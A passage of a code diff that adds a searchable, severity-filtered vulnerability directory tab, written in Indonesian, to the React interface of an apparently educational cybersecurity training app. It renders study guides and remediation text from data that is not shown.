+                    : 'text-slate-400 hover:text-white hover:bg-slate-950/40'
+                }`}
+              >
+                <Shield className="w-4 h-4 text-amber-500" />
+                Jenis Kerentanan
+              </button>
             </div>
 
             <div className="text-xs font-mono text-slate-500 hidden sm:block">
@@ -1188,6 +1591,289 @@ export default function App() {
                   </button>
                 </div>
               </div>
+            ) : activeTab === 'vulnerabilities' ? (
+              /* PANEL C: DETAILED VULNERABILITY DIRECTORY / ENCYCLOPEDIA */
+              <div className="flex flex-col gap-6 max-w-5xl mx-auto w-full">
+                {/* DIRECTORY HEADER HERO */}
+                <div className="bg-slate-900/40 border border-slate-900 rounded-xl p-6 relative overflow-hidden">
+                  <div className="absolute top-0 right-0 w-80 h-80 bg-emerald-500/5 rounded-full blur-[100px] pointer-events-none"></div>
+                  
+                  <div className="flex items-center gap-2 mb-2">
+                    <span className="font-mono text-[11px] font-bold text-amber-500 uppercase tracking-widest">
+                      Threat Intel & Cyber Curriculum
+                    </span>
+                    <span className="text-slate-600">•</span>
+                    <span className="text-xs text-slate-400 font-mono">Daftar Klasifikasi Kerentanan</span>
+                  </div>
+
+                  <h2 className="text-3xl font-black text-white mb-3 tracking-tight">
+                    Pusat Referensi & Jenis Kerentanan Siber
+                  </h2>
+                  <p className="text-slate-300 text-sm leading-relaxed max-w-3xl">
+                    Selamat datang di direktori komprehensif jenis kerentanan aplikasi (vulnerabilities) dan bug hunting. 
+                    Materi ini dirancang sesuai standar klasifikasi industri seperti <strong className="text-emerald-400">OWASP Top 10</strong> serta <strong className="text-emerald-400">Common Weakness Enumeration (CWE)</strong>. 
+                     Gunakan panel pencarian di bawah untuk memfilter jenis celah atau klik kartu untuk melihat contoh payload teknis dan langkah remediasinya.
+                  </p>
+                </div>
+
+                {/* SEARCH AND FILTER TOOLS */}
+                <div className="flex flex-col sm:flex-row gap-4 items-center justify-between bg-slate-900/30 border border-slate-900 p-4 rounded-xl">
+                  <div className="relative w-full sm:max-w-md">
+                    <input
+                      type="text"
+                      placeholder="Cari nama celah, OWASP tag, atau kata kunci..."
+                      value={vulnSearchQuery}
+                      onChange={(e) => setVulnSearchQuery(e.target.value)}
+                      className="w-full bg-slate-950 border border-slate-800 text-slate-100 placeholder-slate-500 px-4 py-2.5 pl-10 rounded-lg text-xs font-mono focus:outline-none focus:border-emerald-500 transition"
+                    />
+                    <div className="absolute left-3.5 top-3.5 text-slate-500 pointer-events-none">
+                      <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg>
+                    </div>
+                  </div>
+                  <div className="flex items-center gap-2 shrink-0 self-start sm:self-auto">
+                    <span className="text-[11px] font-mono text-slate-400 uppercase tracking-wider">Severity Filter:</span>
+                    <div className="flex gap-1.5">
+                      {['ALL', 'CRITICAL', 'HIGH', 'MEDIUM'].map((sev) => (
+                        <button
+                          key={sev}
+                          onClick={() => setVulnSeverityFilter(sev)}
+                          className={`px-2.5 py-1 text-[10px] font-bold font-mono rounded transition ${
+                            vulnSeverityFilter === sev
+                              ? 'bg-emerald-500 text-slate-950 shadow shadow-emerald-500/20'
+                              : 'bg-slate-950 border border-slate-800 text-slate-400 hover:text-white hover:bg-slate-900'
+                          }`}
+                        >
+                          {sev}
+                        </button>
+                      ))}
+                    </div>
+                  </div>
+                </div>
+
+                 {/* VULNERABILITIES CATEGORIZED LIST */}
+                 <div className="space-y-8">
+                   {totalFilteredVulnerabilitiesCount > 0 ? (
+                     filteredCategories.map((category) => {
+                       const isTutorialExpanded = expandedTutorialCategory === category.id;
+                       
+                       return (
+                         <div
+                           key={category.id}
+                           className="bg-slate-900/10 border border-slate-900 rounded-2xl p-5 md:p-6 space-y-4 shadow-sm relative overflow-hidden"
+                         >
+                           {/* Decorative subtle ambient gradient per category */}
+                           <div className="absolute top-0 right-0 w-48 h-48 bg-emerald-500/[0.015] rounded-full blur-3xl pointer-events-none"></div>
+                           
+                           {/* CATEGORY HEADER */}
+                           <div className="flex flex-col md:flex-row md:items-start justify-between gap-4 border-b border-slate-900/60 pb-4">
+                             <div className="space-y-1.5">
+                               <div className="flex items-center gap-2">
+                                 <span className="bg-emerald-500/10 text-emerald-400 font-mono text-[10px] font-bold px-2 py-0.5 rounded border border-emerald-500/20">
+                                   KATEGORI #{category.number}
+                                 </span>
+                                 <span className="text-slate-500 text-xs">•</span>
+                                 <span className="text-slate-400 font-mono text-[11px]">
+                                   {category.items.length} celah ditemukan
+                                 </span>
+                               </div>
+                               <h3 className="text-lg md:text-xl font-extrabold text-white tracking-tight">
+                                 {category.name}
+                               </h3>
+                               <p className="text-slate-400 text-xs leading-relaxed max-w-4xl">
+                                 {category.description}
+                               </p>
+                             </div>
+                             
+                             {/* TUTORIAL TOGGLE BUTTON */}
+                             <button
+                               onClick={() => setExpandedTutorialCategory(isTutorialExpanded ? null : category.id)}
+                               className={`self-start md:self-auto px-4 py-2 rounded-lg text-xs font-mono font-bold tracking-wide flex items-center gap-2 transition-all shrink-0 ${
+                                 isTutorialExpanded
+                                   ? 'bg-amber-500 text-slate-950 shadow shadow-amber-500/20'
+                                   : 'bg-slate-950 hover:bg-slate-900 border border-slate-800 text-amber-400 hover:text-amber-300'
+                               }`}
+                             >
+                               <BookOpen className="w-4 h-4 shrink-0" />
+                               {isTutorialExpanded ? 'Tutup Panduan Belajar ▲' : 'Buka Panduan Belajar 💡'}
+                             </button>
+                           </div>
+
+                           {/* EXPANDABLE STUDY GUIDE & TUTORIAL BOX */}
+                           {isTutorialExpanded && (
+                             <div className="bg-amber-500/[0.03] border border-amber-500/20 p-5 rounded-xl space-y-3 animate-fadeIn">
+                               <div className="flex items-center gap-2 text-amber-400 border-b border-amber-500/10 pb-2">
+                                 <Sparkles className="w-4 h-4 text-amber-500" />
+                                 <h4 className="text-xs font-mono font-bold uppercase tracking-wider">
+                                   {category.tutorialTitle}
+                                 </h4>
+                               </div>
+                               
+                               <div className="text-slate-300 text-xs leading-relaxed space-y-3 font-sans">
+                                 {category.studyGuide.split('\n').map((line, lIdx) => {
+                                   if (line.startsWith('### ')) {
+                                     return (
+                                       <h5 key={lIdx} className="text-sm font-bold text-amber-400 mt-3 mb-1 first:mt-0">
+                                         {line.replace('### ', '')}
+                                       </h5>
+                                     );
+                                   }
+                                   if (line.startsWith('1. ') || line.startsWith('2. ') || line.startsWith('3. ') || line.startsWith('4. ')) {
+                                     const prefixLength = line.indexOf('. ') + 2;
+                                     const stepNum = line.substring(0, line.indexOf('.'));
+                                     const restText = line.substring(prefixLength);
+                                     
+                                     return (
+                                       <div key={lIdx} className="flex gap-2.5 mt-2 first:mt-0 pl-1">
+                                         <span className="w-5 h-5 rounded-full bg-amber-500/15 border border-amber-500/30 text-amber-400 flex items-center justify-center font-mono text-[10px] shrink-0 font-bold">
+                                           {stepNum}
+                                         </span>
+                                         <p
+                                           className="text-slate-300"
+                                           dangerouslySetInnerHTML={{
+                                             __html: restText.replace(/`([^`]+)`/g, '<code class="bg-slate-900 border border-slate-800 text-emerald-400 px-1.5 py-0.5 rounded font-mono text-[10px]">$1</code>')
+                                           }}
+                                         />
+                                       </div>
+                                     );
+                                   }
+                                   if (line.trim().length > 0) {
+                                     return (
+                                       <p
+                                         key={lIdx}
+                                         className="text-slate-300 pl-1"
+                                         dangerouslySetInnerHTML={{
+                                           __html: line.replace(/`([^`]+)`/g, '<code class="bg-slate-900 border border-slate-800 text-emerald-400 px-1.5 py-0.5 rounded font-mono text-[10px]">$1</code>')
+                                         }}
+                                       />
+                                     );
+                                   }
+                                   return null;
+                                 })}
+                               </div>
+                             </div>
+                           )}
+
+                           {/* NESTED SUB-ITEMS GRID LIST */}
+                           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                             {category.items.map((vuln, vIdx) => {
+                               const isExpanded = expandedVuln === vuln.title;
+                               const severityColors = {
+                                 CRITICAL: 'text-rose-400 bg-rose-950/40 border-rose-900/60',
+                                 HIGH: 'text-orange-400 bg-orange-950/40 border-orange-900/60',
+                                 MEDIUM: 'text-yellow-400 bg-yellow-950/40 border-yellow-900/60',
+                                 LOW: 'text-slate-400 bg-slate-900/40 border-slate-800'
+                               };
+
+                               return (
+                                 <div
+                                   key={vIdx}
+                                   className={`bg-slate-950/40 border rounded-xl overflow-hidden transition-all duration-300 ${
+                                     isExpanded 
+                                       ? 'border-emerald-500/40 bg-slate-950/75 col-span-1 md:col-span-2 shadow-lg shadow-emerald-950/5' 
+                                       : 'border-slate-900 hover:border-slate-800 bg-slate-950/20 hover:bg-slate-950/40'
+                                   }`}
+                                 >
+                                   {/* COLLAPSIBLE HEADER CARD */}
+                                   <div
+                                     onClick={() => setExpandedVuln(isExpanded ? null : vuln.title)}
+                                     className="p-5 flex items-start gap-4 cursor-pointer select-none"
+                                   >
+                                     <div className="w-10 h-10 rounded-lg bg-slate-900 border border-slate-850 flex items-center justify-center shrink-0 mt-0.5">
+                                       {vuln.severity === 'CRITICAL' ? (
+                                         <Skull className="w-5 h-5 text-rose-500" />
+                                       ) : vuln.severity === 'HIGH' ? (
+                                         <AlertTriangle className="w-5 h-5 text-orange-400" />
+                                       ) : (
+                                         <Shield className="w-5 h-5 text-yellow-500" />
+                                       )}
+                                     </div>
+                                     
+                                     <div className="flex-1 min-w-0">
+                                       <div className="flex flex-wrap items-center gap-2 mb-1">
+                                         <span className={`text-[9px] font-mono font-bold tracking-widest px-2 py-0.5 rounded border uppercase ${severityColors[vuln.severity]}`}>
+                                           {vuln.severity}
+                                         </span>
+                                         <span className="bg-slate-900 border border-slate-800 text-slate-400 text-[10px] font-mono px-2 py-0.5 rounded">
+                                           {vuln.owasp}
+                                         </span>
+                                       </div>
+                                       <h4 className="text-base font-bold text-white tracking-tight hover:text-emerald-400 transition">
+                                         {vuln.title} {vuln.engTitle ? <span className="text-slate-500 font-mono text-xs font-normal">({vuln.engTitle})</span> : null}
+                                       </h4>
+                                       <p className="text-slate-400 text-xs mt-1.5 leading-relaxed line-clamp-2">
+                                         {vuln.description}
+                                       </p>
+                                       
+                                       <div className="flex items-center gap-1.5 text-[10px] font-mono text-emerald-400 mt-3">
+                                         <span>{isExpanded ? 'Sembunyikan detail ▲' : 'Lihat payload & mitigasi ▼'}</span>
+                                       </div>
+                                     </div>
+                                   </div>
+
+                                   {/* EXPANDED INNER SECTION */}
+                                   {isExpanded && (
+                                     <div className="px-5 pb-6 border-t border-slate-900/80 pt-5 bg-slate-950/60 space-y-4">
+                                       <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
+                                         <div className="space-y-1.5">
+                                           <span className="text-[10px] font-mono text-slate-500 uppercase block tracking-wider font-bold">Deskripsi Lengkap</span>
+                                           <p className="text-slate-300 text-xs leading-relaxed">
+                                             {vuln.description}
+                                           </p>
+                                         </div>
+                                         <div className="space-y-1.5">
+                                           <span className="text-[10px] font-mono text-slate-500 uppercase block tracking-wider font-bold">Saran Remediasi & Mitigasi</span>
+                                           <p className="text-slate-300 text-xs leading-relaxed italic border-l-2 border-emerald-500 pl-3">
+                                             {vuln.remediation}
+                                           </p>
+                                         </div>
+                                       </div>
+
+                                       <div className="space-y-2">
+                                         <span className="text-[10px] font-mono text-slate-500 uppercase block tracking-wider font-bold">Contoh Vektor / Skenario Eksploitasi Teknis</span>
+                                         <div className="bg-slate-950 border border-slate-900 p-3.5 rounded-lg flex items-center justify-between gap-4">
+                                           <code className="text-emerald-400 font-mono text-xs break-all selection:bg-emerald-500 selection:text-black">
+                                             {vuln.example}
+                                           </code>
+                                         </div>
+                                       </div>
+
+                                       {vuln.relatedLessonId && (
+                                         <div className="pt-2">
+                                           <button
+                                             onClick={() => {
+                                               setActiveLessonId(vuln.relatedLessonId);
+                                               setActiveTab('lecture');
+                                             }}
+                                             className="bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold px-4 py-2 rounded-lg text-xs uppercase tracking-wider flex items-center gap-1.5 transition-all shadow-md shadow-emerald-500/10 hover:shadow-emerald-500/20"
+                                           >
+                                             <Play className="w-3.5 h-3.5" />
+                                             Mulai Praktik di Lab 🎯
+                                           </button>
+                                         </div>
+                                       )}
+                                     </div>
+                                   )}
+                                 </div>
+                               );
+                             })}
+                           </div>
+                         </div>
+                       );
+                     })
+                   ) : (
+                     <div className="py-12 text-center border border-dashed border-slate-900 rounded-xl bg-slate-900/5">
+                       <HelpCircle className="w-8 h-8 text-slate-600 mx-auto mb-2" />
+                       <p className="text-slate-400 text-xs font-mono">Tidak ada kerentanan yang cocok dengan kriteria pencarian.</p>
+                       <button
+                         onClick={() => { setVulnSearchQuery(''); setVulnSeverityFilter('ALL'); }}
+                         className="text-xs text-emerald-400 mt-2 font-bold font-mono underline hover:text-emerald-300"
+                       >
+                         Reset Pencarian & Filter
+                       </button>
+                     </div>
+                   )}
+                 </div>
+               </div>
             ) : (
               /* PANEL B: MOCK TERMINAL & SANDBOX SIMULATOR GRAPHICS */
               <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch flex-1">
